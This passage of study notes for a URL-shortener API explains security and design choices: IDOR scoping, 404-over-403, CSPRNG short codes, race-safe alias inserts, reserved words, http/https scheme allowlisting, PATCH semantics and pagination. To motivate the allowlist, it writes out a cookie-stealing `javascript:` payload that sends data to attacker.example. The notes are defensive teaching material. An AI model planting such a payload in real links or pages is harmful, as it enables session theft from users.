adjacent/predictable ones, or simply try ids seen in another user's
shared link) and read, edit, or delete a link that isn't theirs — while
still passing `requireAuth` with a perfectly valid token. This is
exactly the gap authentication alone cannot close.

**How it works mechanically.** IDOR isn't a single bug pattern to grep
for — it's a category defined by what's _missing_: an authorization
check between "the request named a resource" and "the resource was
acted on." In this codebase specifically, it would look like a route or
service function that took an `id` and ran a query against it without
also constraining by `user_id` — the exact thing every function in
`linkService.ts` avoids.

**Where it lives in the codebase.** Not any one file — it's a property
of every function in `src/services/linkService.ts` that touches an
existing row, all consistently scoped as covered above, plus the
corresponding object-level-authorization tests in
`tests/routes/links.test.ts` and `tests/services/linkService.test.ts`
that actively try to demonstrate the vulnerability's absence rather than
just its features' happy paths.

**Common pitfalls.**

- Assuming a resource's UUID being "unguessable" is itself an
  authorization control — it isn't. A UUID is an identifier, not a
  secret; anyone who legitimately sees a link id once (a leaked URL, a
  browser history entry, a referrer header) has it forever, and IDOR
  protection has to hold even when the attacker already has a real id in
  hand, not just against blind enumeration.
- Testing only the happy path (owner can CRUD their own link) and never
  writing the negative case (a second user _cannot_) — a route can look
  completely correct and still be an IDOR if nobody ever tried to break
  it from the outside. This is exactly why this phase's test suite makes
  the cross-user attempt-and-verify-unchanged pattern mandatory for every
  endpoint, not optional.

**Production considerations.** IDOR is consistently one of the most
common vulnerability classes found in real-world bug bounty reports,
precisely because it's easy to introduce (one missing WHERE clause) and
easy to miss in review (the code "looks" like ordinary CRUD). The
mitigation that scales is the one used here: make the authorized path
the _only_ path a query can take, rather than relying on every reviewer
to notice a missing check in every new endpoint forever.

**Interview answer.** Broken access control — specifically IDOR, insecure
direct object reference — is OWASP's #1 web risk category, and it's
exactly the shape of bug `GET /api/links/:id` is vulnerable to if the
`user_id` scoping isn't in the query: an authenticated user supplying
someone else's link id and getting their data back. It's dangerous
because it's invisible in the happy path — the endpoint looks completely
correct until someone deliberately tries a second user's resource id,
which is why I treat "attacker attempts every CRUD operation on another
user's resource and it 404s, with the row provably unchanged" as a
required test for every resource endpoint, not an edge case.

---

### 403 vs. 404 for another user's resource

**What it is.** When user B requests a link that exists but belongs to
user A, the server has (at least) two honest-sounding response options:
403 Forbidden ("this exists, but you can't have it") or 404 Not Found
("nothing here"). This project returns 404.

**Why it exists in this project.** A 403 response, on its own,
_confirms_ that the id refers to a real resource — it tells the caller
"you found something, you're just not allowed to see it." For a resource
whose id space an attacker could iterate or guess pieces of, that's an
information leak: a 403/404 split lets someone map out which ids
correspond to real links without ever seeing their contents, the same
enumeration risk Phase 4's identical-message decision for login
(`INVALID_CREDENTIALS_MESSAGE`, "no such user" vs "wrong password") was
built to prevent. Returning identical 404s for "doesn't exist" and
"exists but isn't yours" makes both cases genuinely indistinguishable
from the outside.

**How it works mechanically.** `getLink`, `updateLink`, and `deleteLink`
all return `null`/`false` — never throw — for both "no matching row"
and "row exists, wrong `user_id`", because the single WHERE clause
covering both id and ownership can't itself tell those two cases apart
(and by design, doesn't try to). The route layer then throws one
`notFound('Link not found')` for that single falsy outcome:

```ts
const link = await getLink(req.userId!, id);
if (!link) {
  throw notFound('Link not found');
}
```

There's no `forbidden()` call anywhere in `src/routes/links.ts` — the
service layer's inability to distinguish the two cases makes it
impossible for the route to leak the distinction even by accident.

**Where it lives in the codebase.** `src/services/linkService.ts`
(`null`/`false` returns, no distinction made) and `src/routes/links.ts`
(uniform `notFound()` on every falsy service result, for `GET`, `PATCH`,
and `DELETE /:id`).

**Common pitfalls.**

- Implementing the ownership check as a separate step _after_ an
  existence check — `if (!link) throw notFound(); if (link.userId !==
req.userId) throw forbidden();` — which reintroduces exactly the
  distinguishable-response problem this design avoids, even if each
  individual check looks reasonable in isolation.
- Assuming 404-for-both is free — it does cost something, covered next.

**Production considerations.** This is a real, acknowledged tradeoff, not
a free lunch: a legitimate caller who mistypes an id and one whose id is
correct but unauthorized get the identical, less-specific error message,
which makes debugging a legitimate integration slightly harder ("is my
id wrong, or do I not have access?"). That cost is accepted here because
the alternative — a clearer error for legitimate callers — hands the
same clarity to an attacker probing the id space. Systems with a strong
audit-logging story sometimes split the difference: return 404 to the
client in both cases, but log the _actual_ reason (not found vs.
forbidden) server-side, so operators retain the diagnostic signal
without exposing it externally.

**Interview answer.** I return 404, not 403, when a link exists but
belongs to another user — the same information-hiding logic as Phase 4's
identical login-error message. A 403 confirms the id is real, which lets
an attacker map out which ids correspond to actual resources without
ever seeing their contents. The service layer structurally can't leak
this distinction because `getLink`/`updateLink`/`deleteLink` return the
same falsy value for "doesn't exist" and "exists but isn't yours" — the
route always throws one generic 404 for both. The real cost is debugging
friction for a legitimate caller who genuinely mistyped an id, which I
accept as the right tradeoff for a resource with a guessable-format id
space.

---

### CSPRNG vs. `Math.random()` for identifiers

**What it is.** A cryptographically secure pseudo-random number generator
(CSPRNG) produces output that's computationally infeasible to predict
even if an attacker has seen previous outputs and knows the algorithm.
`Math.random()`, in V8, is backed by xorshift128+ — fast and
statistically well-distributed, but _not_ designed to resist prediction;
its internal state has been reconstructed from as few as a handful of
observed outputs in published research.

**Why it exists in this project.** A link's short code is, functionally,
a bearer credential — whoever has the code (or, once Phase 7 exists,
whoever hits the right URL) reaches the destination behind it. If short
codes were generated with a predictable algorithm, an attacker who
observed a few real codes could potentially predict others without ever
being handed them, the same way a predictable session-token generator
would undermine everything Phase 4 did correctly with JWTs. `nanoid`'s
use of `crypto.randomBytes` closes that gap the same way bcrypt's random
salt and the JWT's HMAC signature do elsewhere in this codebase.

**How it works mechanically.** `crypto.randomBytes` (which `nanoid`
calls internally) sources entropy from the operating system's CSPRNG —
on Linux, ultimately `getrandom(2)`, backed by the kernel's entropy pool.
That's a fundamentally different trust model from `Math.random()`, whose
internal state is just 128 bits set once at engine startup and then
deterministically transformed — no external entropy involved after that.

**Where it lives in the codebase.** `src/lib/shortCode.ts` —
`generateShortCode()` is the only place this project generates an
identifier that gates access to something, making it the one place this
distinction is load-bearing (JWT signing already uses `jsonwebtoken`'s
own CSPRNG-backed randomness internally, from Phase 4).

**Common pitfalls.**

- Using `Math.random()` for "just" a short code because it's not a
  password — the threat model is the same shape as a password: an
  attacker able to predict outputs can access something they shouldn't,
  regardless of what the value is called.
- Assuming length alone solves this — a long, predictable identifier is
  still predictable. Unpredictability comes from the _source_ of
  randomness, not the string's length; length only affects how many
  outputs an attacker would have to enumerate if they _were_ forced to
  guess blindly, which is a separate concern (see collision probability
  below).

**Production considerations.** None beyond what's already standard here:
CSPRNGs occasionally block briefly on systems with genuinely low
entropy (rare on a server with modern kernels, more of a concern on
constrained embedded devices this project will never run on) — not a
practical concern at this scale.

**Interview answer.** `Math.random()` isn't cryptographically secure —
its internal PRNG state can, in principle, be reconstructed from
observed outputs, which matters for anything whose unpredictability is
actually load-bearing for security. A link's short code qualifies: it's
effectively a bearer credential for whatever it points to. `nanoid` uses
`crypto.randomBytes`, which is backed by the OS's CSPRNG, closing that
gap the same way this project already relies on CSPRNG-backed randomness
for JWT signing and bcrypt salts.

---

### Collision probability and why the DB constraint is the real guarantee

**What it is.** With a 62-character alphabet (`0-9A-Za-z`) and a 7-character
code, there are 62⁷ ≈ 3.5 trillion possible short codes. The "birthday
paradox" approximation for collision probability after generating `n`
random codes from a space of size `N` is roughly `n² / (2N)`. At an
optimistic-but-plausible 1 million links, that's `(10⁶)² / (2 × 3.5×10¹²)`
≈ 0.014% — genuinely small, but not zero, and it only grows as the link
count does.

**Why it exists in this project.** "Vanishingly unlikely" is not the
same as "impossible," and code that only works when a rare event
doesn't happen is a latent bug, not a solved problem. `createLink`
therefore doesn't treat a collision as something that can't occur — it
handles it as a normal, expected (if rare) outcome via retry.

**How it works mechanically.** Two independent layers work together, and
it matters that they're not the same thing: the birthday-paradox math
above says a _specific pair_ of generated codes colliding is rare, which
justifies why a small, fixed retry budget (5 attempts) is enough in
practice — but the actual _correctness_ guarantee that a collision is
ever caught at all is the database's `UNIQUE` constraint on
`links.short_code`, enforced unconditionally by Postgres regardless of
how the application arrived at a duplicate value:

```ts
for (let attempt = 0; attempt < MAX_GENERATION_ATTEMPTS; attempt += 1) {
  const row = await insertLink(userId, generateShortCode(), input);
  if (row) return toLink(row);
}
throw internal('Failed to generate a unique short code after multiple attempts');
```

`insertLink` catches Postgres error `23505` (unique_violation) and
returns `null` rather than throwing, letting the loop try again with a
fresh code. Exhausting all 5 attempts — at the probabilities above,
something that should essentially never happen from randomness alone —
throws `internal(...)`, a 500: at that point the honest read is "the
generator or its alphabet regressed," not "bad luck," which is exactly
what `tests/lib/shortCode.test.ts`'s alphabet/length regression test
exists to catch before it ever reaches this failure mode in the first
place.

**Where it lives in the codebase.** The retry loop:
`src/services/linkService.ts`, `createLink`. The actual guarantee:
`migrations/20260810111606896_create-links-table.ts`'s `short_code`
column, declared `unique: true`.

**Common pitfalls.**

- Treating the retry loop itself as the correctness mechanism — it's
  defense-in-depth for an already-rare event, not what makes duplicate
  codes impossible. Delete the retry loop and the system is merely less
  convenient on the rare occasion of a real collision (one client gets a
  409/500 it has to retry); delete the `UNIQUE` constraint and the system
  is _broken_ — two links could silently share a short code, and
  whichever route Phase 7 resolves that code to would be ambiguous or
  simply wrong.
- Under-provisioning retry attempts relative to actual expected
  collision rates at a _much_ larger scale than this project targets —
  worth revisiting the math (or the code length) if link volume ever
  approaches a meaningful fraction of 62⁷.

**Production considerations.** At genuinely large scale (see "what would
change at 10 million links" below), the fix isn't more retries — it's
either a longer code (each added character multiplies the space by 62)
or switching short-code assignment to something collision-free by
construction, like a base62-encoded auto-incrementing id or a
Twitter-Snowflake-style scheme, trading the current scheme's
unpredictability for guaranteed uniqueness and picking up unpredictability
some other way (e.g. a per-code random suffix) if it's still needed.

**Interview answer.** At 62⁷ possible codes, the birthday-paradox
collision probability at a million existing links is around 0.01% — low
enough that a small retry budget handles it comfortably. But the retry
loop isn't what makes the system correct; the database's `UNIQUE`
constraint is. The loop catches Postgres's `23505` unique-violation and
tries a fresh code, up to 5 times, and if it ever exhausts those
attempts, that's actually stronger evidence of a code regression (a
shrunk alphabet, a broken generator) than of bad luck — which is exactly
why there's a dedicated test asserting the generator's actual character
set and length, not just spot-checking that it returns _a_ string.

---

### The check-then-insert TOCTOU race, seen for the third time in this project

**What it is.** TOCTOU (time-of-check to time-of-use) is a race
condition where a program checks a condition, then acts as if that
condition still holds — but between the check and the action, another
process can change the underlying state, invalidating the check. Here:
"is this alias free?" (check) followed by "insert a row using this
alias" (use) — two separate operations, with a gap between them where
another request can slip in.

**Why it exists in this project — again.** This is the third time this
exact shape has shown up. First, `authService.signup`: a pre-check
`SELECT` for an existing email, then `INSERT`. Second,
`authService.findOrCreateOAuthUser`: the same shape, plus a more nuanced
variant that re-fetches on conflict to distinguish "the same actor raced
itself" (not an error) from "a genuine competing claim" (a real 409).
Third, here: `createLink`'s custom-alias path pre-checks `SELECT id FROM
links WHERE short_code = $1` before inserting. Two concurrent requests
for the _same_ custom alias can both pass that `SELECT` — finding no
existing row — before either has committed an `INSERT`. Recognizing the
same pattern for a third time is the point: this isn't a one-off
gotcha, it's a systemic property of any "check uniqueness, then write"
sequence that isn't wrapped in additional protection.

**How it works mechanically.** The fix pattern established in Phase 4
and reused verbatim here: the pre-check `SELECT` stays, purely to give
the common, non-racing case a fast, friendly 409 without a wasted round
trip to the database's constraint machinery — but it is explicitly _not_
what makes the outcome correct. The `INSERT` itself is wrapped in a
try/catch for Postgres error `23505` (unique_violation), and losing that
race converts cleanly into the same `conflict()` a sequential duplicate
would produce:

```ts
const existing = await query<{ id: string }>('SELECT id FROM links WHERE short_code = $1', [
  input.customAlias,
]);
if (existing.rows[0]) {
  throw conflict('This alias is already taken');
}

const row = await insertLink(userId, input.customAlias, input);
if (!row) {
  // Lost a race against a concurrent create for the same alias since the pre-check.
  throw conflict('This alias is already taken');
}
```

Notably, the _generated_-code path in the same function has no pre-check
`SELECT` at all — see the collision-probability section above for why a
pre-check there would be actively pointless rather than merely
redundant.

**Where it lives in the codebase.** `src/services/linkService.ts`,
`createLink`'s custom-alias branch (this phase);
`src/services/authService.ts`, `signup` and `findOrCreateOAuthUser`
(Phase 4/5, the first two occurrences).

**Common pitfalls.**

- Treating the pre-check `SELECT` as sufficient on its own, because "the
  window is really small" — the window's _size_ is irrelevant to
  whether the race is real; under real production concurrency (a
  double-submitted form, a retried request, a deliberate attacker firing
  two requests simultaneously) small windows get hit often enough to
  matter.
- Forgetting the 23505 catch when writing a _new_ uniqueness check in the
  future, because the pre-check `SELECT` alone "looks" like it already
  solved the problem in testing (where concurrent requests are rare by
  accident, not by design).

**Production considerations.** This pattern generalizes to essentially
any uniqueness constraint enforced partly in application logic: the
database constraint is always the source of truth, and application-level
pre-checks are only ever a UX optimization for the common case, never a
substitute for the constraint. Anywhere this codebase adds a new
`UNIQUE` column in the future, this two-part pattern (pre-check for a
nice error message, catch-23505 for correctness) is the template.

**Interview answer.** This is the third time this project hits the same
check-then-insert race: user signup email, OAuth account linking, and now
custom short-code aliases. In every case, a `SELECT`-then-`INSERT`
sequence has a gap where two concurrent requests can both pass the check
before either commits — the check alone can't be the correctness
guarantee. The actual guarantee is always the database's own `UNIQUE`
constraint, with the pre-check `SELECT` kept purely as a fast, friendly
error path for the non-racing common case. Recognizing it as the same
recurring pattern, rather than three unrelated bugs, is what makes it
easy to apply the identical, already-proven fix each time.

---

### Reserved words and route shadowing

**What it is.** "Route shadowing" is what happens when two different
route patterns could both match the same incoming path, and the one that
actually wins isn't the one a developer expects — often because a
literal, specific path segment (like `/api/health`) collides with a
wildcard or parameterized route (like `/:shortCode`) that would also
match that exact string.

**Why it exists in this project.** It doesn't apply _yet_, in the
literal sense — this phase deliberately builds no public redirect route
at all. But the alias a user picks _today_ determines the value stored
in `short_code` forever (aliases are immutable after creation, by this
phase's design), and Phase 7 will mount a route shaped like `GET
/:shortCode` at the application root to resolve any code to its
destination. If a user were allowed to register the alias `"health"`
today, that row would sit in the database as a live landmine: the moment
Phase 7's redirect route exists, a request to `/health` would be
ambiguous between "the real health-check endpoint" and "someone's
short link" — and depending on Express's route registration order,
one of those would silently shadow the other in a way that's very hard
to debug after the fact, because the bug was actually introduced weeks
earlier, at alias-creation time.

**How it works mechanically.** `RESERVED_SHORT_CODES` in
`src/lib/shortCode.ts` is a fixed set of path segments that are real (or
realistically foreseeable) top-level API routes — `api`, `health`,
`docs`, `auth`, `login`, `signup`, `admin`, `static`, `assets`,
`favicon.ico`, `robots.txt`. `customAliasSchema`'s `.refine()` rejects
any alias matching one of these, case-insensitively, at creation time —
before a colliding row can ever be written, not after Phase 7 discovers
the conflict.

**Where it lives in the codebase.** `src/lib/shortCode.ts`
(`RESERVED_SHORT_CODES`, `isReservedShortCode`, the `.refine()` inside
`customAliasSchema`).

**Common pitfalls.**

- Deferring this check to whenever the redirect route is actually built
  (Phase 7) — by then, any reserved-word aliases created in the meantime
  would already be live, shared, and painful to invalidate retroactively.
  Enforcing it now, before the routes it protects even exist, avoids
  ever having to clean up after the fact.
- Treating the reserved list as exhaustive/permanent — it needs to be
  kept in sync with the application's actual top-level routes as new
  ones are added; a reserved-word list that drifts out of date silently
  stops protecting anything new.

**Production considerations.** A more scalable alternative at a larger
route surface is deriving the reserved list programmatically from the
Express router's registered top-level paths at startup, rather than
maintaining a hand-written array that can drift — not adopted here
since the current route surface is small enough that a short, explicit
list is easier to read and reason about than a layer of route
introspection.

**Interview answer.** Reserved words exist because a custom alias
written today becomes a permanent path segment that Phase 7's `/:shortCode`
redirect route will later try to resolve — if someone registered "health"
as their alias before that route existed, it would silently collide with
the real health-check endpoint once it did. I reject a fixed list of
real and foreseeable API path segments at alias-creation time, before
Phase 7's route (or the conflict) exists at all, rather than waiting to
discover the collision only once the redirect route is live and someone's
already using it.

---

### URL scheme validation as an open-redirect / XSS defense

**What it is.** A URL's scheme (the part before `://`, or before `:` for
schemes like `javascript:`/`data:`) determines fundamentally what
happens when a browser navigates to it. `http:`/`https:` load a page over
the network. `javascript:` executes arbitrary script in the current
page's context. `data:` embeds inline content (including
`data:text/html,<script>...`) directly, no network fetch at all. `file:`
attempts to read from the local filesystem.

**Why it exists in this project.** `destinationUrl` is exactly the kind
of field where scheme matters enormously and is easy to overlook,
because "is this a valid URL" and "is this a _safe_ URL to redirect a
browser to" are different questions — `new URL('javascript:alert(1)')`
parses without error; it's a syntactically perfectly valid URL, just an
extremely dangerous one to redirect to. Once Phase 7's redirect route
exists, it will `302` a browser straight to whatever's stored in
`destination_url` — if that value were ever `javascript:document.location='https://attacker.example?cookie='+document.cookie`,
Click Scope itself would become the delivery mechanism for a
same-origin-context XSS attack against anyone who clicked the short
link, using this application's own trusted domain to launder it.

**How it works mechanically.** `destinationUrlSchema` in
`src/routes/links.ts` runs two checks: Zod's built-in `.url()` for
general well-formedness, then a `.refine()` that parses the string with
`new URL(...)` and checks its `.protocol` against an explicit allowlist:

```ts
const destinationUrlSchema = z
  .string()
  .url('destinationUrl must be a valid URL')
  .refine((url) => ['http:', 'https:'].includes(new URL(url).protocol), {
    message: 'destinationUrl must use http or https',
  });
```

This is an **allowlist**, not a blocklist of known-bad schemes
(`javascript:`, `data:`, `file:`, ...) — deliberately, because a
blocklist only ever protects against schemes someone thought to list;
an allowlist protects against every scheme that isn't `http`/`https`,
including ones nobody's thought of yet.

**Where it lives in the codebase.** `src/routes/links.ts`
(`destinationUrlSchema`, shared by both `createLinkSchema` and
`updateLinkSchema` so the check applies identically on create and on
every subsequent edit).

**Common pitfalls.**

- Validating scheme only at redirect time (i.e., deferring this to
  Phase 7) instead of at write time — a link with a malicious scheme
  would sit in the database as a live payload from the moment it's
  created until whenever a redirect route happens to re-validate it,
  which might be never if that route trusts its stored data. Rejecting
  at write time means no malicious value is ever persisted in the first
  place.
- Writing a blocklist of "known bad" schemes instead of an allowlist of
  "known good" ones — a blocklist requires the defender to have
  anticipated every dangerous scheme in advance; an allowlist requires
  only knowing what's actually needed (`http`/`https`), which is a much
  smaller, more stable list to get right.
- Assuming `.url()` alone is sufficient because "it's a valid URL" —
  validity and safety are orthogonal; `javascript:alert(1)` is a
  perfectly valid URL by the URL spec.

**Production considerations.** Scheme validation closes one class of
open-redirect/XSS risk but not the entire category — a `destinationUrl`
of `https://attacker.example/phishing-page` is scheme-valid and
completely unblocked by this check, because "redirect users to
attacker-controlled but syntactically fine domains" is a different,
harder problem (domain reputation/allowlisting, user-facing interstitial
warnings) that a URL shortener's entire product surface is inherently
exposed to — out of scope for this phase, worth naming explicitly rather
than implying scheme validation is a complete solution.

**Interview answer.** I validate `destinationUrl`'s scheme against an
explicit `http`/`https` allowlist at write time, not just checking
general URL well-formedness. The risk is concrete: `javascript:` and
`data:` URLs are syntactically valid, so a naive `.url()` check alone
lets them through, and once Phase 7's redirect route exists it would
`302` a browser straight into executing that scheme — turning this
application's own trusted domain into a same-origin XSS delivery
mechanism. I used an allowlist rather than a blocklist of known-bad
schemes specifically because a blocklist only protects against threats
someone thought to enumerate in advance; an allowlist doesn't need to.

---

### PATCH vs. PUT, and absent-vs-null in partial updates

**What it is.** PUT semantically means "replace this resource entirely
with what I'm sending" — every field is expected, and an absent field
means "this resource no longer has that value." PATCH means "apply this
partial set of changes" — a field absent from the request body means
"leave it as it is," which is a fundamentally different instruction than
sending that field with an explicit `null`, which means "clear it."
`PATCH /api/links/:id` in this codebase needs exactly that
three-way distinction: unchanged, set-to-a-value, or explicitly-cleared.

**Why it exists in this project.** `expiresAt` and `maxClicks` are
nullable columns where `null` is a meaningful, intentional value ("this
link never expires" / "unlimited clicks"), not the absence of one. A
client that wants to _remove_ an expiration needs a way to say "set
`expiresAt` to null" that's distinguishable from "I didn't mention
`expiresAt`, don't touch it." Collapsing those two into one case (e.g. if
the update handler treated any falsy/undefined `expiresAt` as "clear it")
would make it impossible to send a partial update that touches
`destinationUrl` alone without accidentally wiping `expiresAt` too.

**How it works mechanically.** The mechanism has two layers, and the
important part is _where_ the absent-vs-null information actually lives
after Zod parsing. Verified directly against this project's installed
Zod (3.x):

```js
z.object({ expiresAt: z.string().nullable().optional() }).safeParse({}).data;
// → {}                          ('expiresAt' in data → false)
z.object({ expiresAt: z.string().nullable().optional() }).safeParse({ expiresAt: null }).data;
// → { expiresAt: null }         ('expiresAt' in data → true, value null)
```

Zod does **not** backfill an absent optional key onto its parsed output
— so `'expiresAt' in parsedBody` is a reliable way to ask "did the
client mention this field at all," entirely from the _parsed_ Zod
output, with no need to separately inspect the raw, pre-validation
`req.body`. The route handler in `src/routes/links.ts` uses exactly that
check to build a service-layer input object with only the keys the
client actually sent:

```ts
const body = req.validated?.body as Record<string, unknown>;
const parsed = updateLinkSchema.parse(body);

const input: UpdateLinkInput = {};
if (parsed.destinationUrl !== undefined) input.destinationUrl = parsed.destinationUrl;
if ('expiresAt' in body) input.expiresAt = parsed.expiresAt ?? null;
if ('maxClicks' in body) input.maxClicks = parsed.maxClicks ?? null;
if (parsed.isActive !== undefined) input.isActive = parsed.isActive;
```

`destinationUrl` and `isActive` use the simpler `parsed.field !==
undefined` check instead of `'field' in body` — they're `.optional()`
only, with no `.nullable()`, so for those two fields being `undefined`
in the parsed output and being absent from the raw body are the exact
same condition; only `expiresAt`/`maxClicks` need the raw-body check
because they're the ones that also accept an explicit `null`.
`linkService.updateLink` then only writes a `SET` clause for a column
when its corresponding `UpdateLinkInput` key is `!== undefined` — an
input object with zero keys set skips the `UPDATE` statement entirely
and just returns the current row, since an empty PATCH is a valid no-op,
not an error.

**Where it lives in the codebase.** Schema:
`src/routes/links.ts`, `updateLinkSchema` (`.nullable().optional()` on
`expiresAt`/`maxClicks`, plain `.optional()` on `destinationUrl`/`isActive`,
and `.strict()` at the top level to reject unknown keys like
`customAlias`, which is immutable after creation). Presence-to-input
translation: the route handler shown above. Conditional `SET`-clause
construction: `src/services/linkService.ts`, `updateLink`.

**Common pitfalls.**

- Using `??` (nullish coalescing) directly on `req.body.field` without
  first checking presence — `undefined ?? someDefault` and `null ??
someDefault` both evaluate the same way, silently erasing the
  distinction this whole mechanism exists to preserve.
- Assuming Zod backfills absent optional keys as `undefined` _properties_
  on the output object — it doesn't (per the verified REPL output
  above); the key is simply missing, which is exactly what makes the
  `'key' in parsedBody` check meaningful rather than redundant.
- Forgetting that TypeScript's control-flow narrowing on `'key' in body`
  doesn't transfer to a _different_ object (`parsed`) typed independently
  — `exactOptionalPropertyTypes` will correctly flag `input.field =
parsed.field` as potentially assigning `undefined` even inside an `if
('field' in body)` block, because TS has no way to know the two objects'
  presence conditions are linked; this project resolves it by checking
  `parsed.field !== undefined` directly wherever that's equivalent (see
  above), rather than suppressing the type error.

**Production considerations.** This pattern (nullable-and-optional field,
presence read off the parsed object, conditional SQL `SET` clause) is the
reusable template for every future nullable field this API adds — no new
mechanism needed, just the same three lines repeated per field.

**Interview answer.** PATCH needs to distinguish three states per field:
untouched, set to a value, and explicitly cleared — PUT only has two,
because it assumes every field is always present. I encode that with
Zod's `.nullable().optional()` and read presence directly off the
_parsed_ output using `'field' in body`, which I verified doesn't get
backfilled for absent optional keys — so `safeParse({})` genuinely omits
the key, while `safeParse({ field: null })` includes it with a `null`
value. That distinction flows into a service function that only writes a
SQL `SET` clause for fields actually present in its input object, so an
absent field truly means "don't touch this column" all the way down to
the query.

---

### Pagination: offset vs. cursor, and unbounded limits as a DoS vector

**What it is.** Offset pagination (`LIMIT`/`OFFSET`) asks the database
for "skip N rows, then give me the next M" — simple, and it supports
jumping directly to an arbitrary page. Cursor pagination instead asks
for "give me M rows after this specific row" (typically encoding the
last-seen row's sort key as an opaque token) — it doesn't support
jumping to an arbitrary page number, but it doesn't degrade as the
offset grows the way `OFFSET` does, and it stays correct even if rows
are inserted or deleted between page requests.

**Why it exists in this project.** `GET /api/links` needed _some_
pagination scheme — returning every link a user has ever created in one
response doesn't scale and is exactly the kind of unbounded-response
risk covered below. This phase chose offset pagination deliberately, not
by default: the links table's only index today is on `user_id` alone
(`migrations/20260810111606896_create-links-table.ts`), and that
migration's own comment explicitly defers all query-driven indexing
decisions — including whatever composite index cursor pagination would
need, like `(user_id, created_at, id)` — to a dedicated later indexing
phase. Building that index now, just to support cursor pagination ahead
of when it's needed, would be optimizing a phase that isn't this one's
to own.

**How it works mechanically.** `listLinks` runs two independent,
parallel queries — one for the page of rows, one for the total count —
rather than a single query with a window function, matching this
codebase's existing preference for the simplest correct SQL over a more
clever alternative:

```ts
const [rowsResult, countResult] = await Promise.all([
  query<LinkRow>(
    `SELECT ${LINK_COLUMNS} FROM links WHERE user_id = $1
     ORDER BY created_at DESC, id DESC LIMIT $2 OFFSET $3`,
    [userId, options.limit, options.offset],
  ),
  query<{ count: number }>('SELECT count(*)::int AS count FROM links WHERE user_id = $1', [userId]),
]);
```

`ORDER BY created_at DESC, id DESC` includes `id` as an explicit
tiebreaker deliberately — `created_at` isn't guaranteed unique (two links
created in the same millisecond are entirely possible), and without a
unique tiebreaker, rows with identical timestamps could be ordered
differently between two page requests, corrupting pagination results in
a way that's hard to notice and harder to reproduce.

The `limit` query parameter itself is validated as a positive integer,
but a value **above** `MAX_PAGE_SIZE` (100) is deliberately _clamped_,
not rejected with 400:

```ts
const { limit: requestedLimit, offset } = listLinksQuerySchema.parse(req.validated?.query);
const limit = Math.min(requestedLimit, MAX_PAGE_SIZE);
```

The response's `pagination.limit` always reflects this effective,
clamped value — not whatever the client originally asked for — so a
caller who requested more than the maximum can tell what they actually
got back. This is a deliberate choice over strict rejection: `limit` is
a hint about how much the client wants, not a semantic assertion about
the request's validity the way a malformed UUID is (which genuinely
_can't_ be satisfied, making 400 correct there). An oversized `limit` is
trivially and safely satisfiable by capping it, and well-regarded APIs
(GitHub, Stripe) clamp for exactly this reason — turning an innocent,
slightly-too-eager `?limit=200` into a hard client-facing failure serves
no one, when silently returning a capped, correctly-labeled page does
the same job better.

**Where it lives in the codebase.** `src/services/linkService.ts`,
`listLinks`. `src/routes/links.ts`, `listLinksQuerySchema` and the
clamping logic in the `GET /` handler. `MAX_PAGE_SIZE`/`DEFAULT_PAGE_SIZE`
constants live alongside the schema.

**Common pitfalls.**

- Sorting only by `created_at` without a tiebreaker — works in casual
  testing (timestamps rarely collide when you're creating rows one at a
  time by hand) and silently misbehaves under real concurrent write load.
- Rejecting an oversized `limit` with 400 instead of clamping it —
  defensible, but turns a harmless request into a hard failure for no
  correctness reason; if this project ever changes that decision, it
  should be a deliberate one, documented here, not an accident of "that's
  just what `.max()` does."
- Confusing "malformed" with "oversized": a non-numeric, negative, or
  zero `limit` genuinely cannot be satisfied and correctly stays a 400;
  only the _upper_ bound is clamped rather than rejected.

**Production considerations — what would change this decision.** Offset
pagination's known weakness is that `OFFSET` doesn't skip rows for free —
Postgres still has to scan and discard every skipped row before it can
return the requested page, so deep pages get progressively more
expensive as `offset` grows. That's not a real cost yet at a single
user's realistic link count, but it would become one at very high
per-user link volumes or once deep-page access became a common, not
edge-case, usage pattern — at that point, the fix is cursor pagination
over a purpose-built `(user_id, created_at, id)` index, which the schema
comment already flags as a Phase 11 decision, not a Phase 6 one. (Corrected
from "Phase 12" — see "Phase 11: Database Optimization" below.) Phase 11
did add that composite index — `links_user_id_created_at_id_index` — but
only to remove the `Sort` node from the existing `OFFSET`-based query; it
did not switch the API to cursor pagination, so the deep-page `OFFSET` cost
described above is still real and still unaddressed. The index and the
pagination strategy are separable decisions — this phase resolved the
former, not the latter.

**Interview answer.** I used offset pagination, not cursor, because
cursor pagination needs a composite index this table doesn't have yet —
the links migration explicitly defers all query-driven indexing to a
later phase, and building that index early would be solving a problem
ahead of the phase that owns it. Offset works correctly today off the
existing `user_id` index; it would stop being the right choice once deep
pages or very high per-user link counts made `OFFSET`'s "scan and discard
every skipped row" cost actually matter. Separately, I clamp an
oversized `limit` rather than rejecting it with 400 — unlike a malformed
UUID, a too-large limit is a request that's trivially satisfiable by
capping it, and I echo the effective limit back in the response so the
caller can tell. An unbounded limit, left unclamped, is a real
denial-of-service vector on its own — a single request for an enormous
page forces the server to materialize and serialize an arbitrarily large
result set, real memory/CPU/bandwidth cost that a `MAX_PAGE_SIZE` closes
regardless of whether it's enforced by rejection or by clamping.

---

## Phase 7: The Public Redirect

### The redirect as a hot, unauthenticated path

**What it is.** `GET /:shortCode` (`src/routes/redirect.ts`) is the one
route in this API with no `requireAuth`, no per-user scoping anywhere in
its query, and — by the nature of a URL shortener — the highest expected
request volume of any route in the system by a wide margin. Every other
route in this codebase serves an authenticated owner looking at their own
data; this one serves the general public clicking a link they found
somewhere else entirely.

**Why it exists in this project.** A short link is useless if only its
owner can resolve it — the entire point of Click Scope is that anyone,
logged in or not, can click `clickscope.io/abc1234` and land on the real
destination. That requirement is what makes this route structurally
different from every route built in Phases 4-6: there is no bearer token
to check, no `user_id` to scope a query by, and no session to reason
about.

**How it works mechanically.** `getLinkByShortCode` in
`src/services/linkService.ts` is the one lookup function in the file with
no `userId` parameter — `SELECT ... FROM links WHERE short_code = $1`,
full stop. Every other lookup in that file (`getLink`, `updateLink`,
`deleteLink`) scopes with `AND user_id = $2` as the actual authorization
boundary; this one has no such boundary because there's no user to check
against. The route itself has no `requireAuth` middleware in its chain at
all.

**Where it lives in the codebase.** `src/routes/redirect.ts` (no auth
middleware); `src/services/linkService.ts`'s `getLinkByShortCode` (the
unscoped lookup); `src/app.ts` (mount position, see below).

**Common pitfalls.**

- Reflexively adding `requireAuth` here out of habit, since every other
  route in the app has it — that would break the entire feature; a
  visitor clicking a shared link has no account and no token.
- Reusing `getLink`/its `user_id`-scoped query for the redirect path "for
  consistency" — there is no authenticated user to scope by here, so the
  query would need `user_id` to be nullable/wildcarded, quietly
  reintroducing an authorization check that doesn't apply and can only
  confuse the one function in the file that's deliberately public.

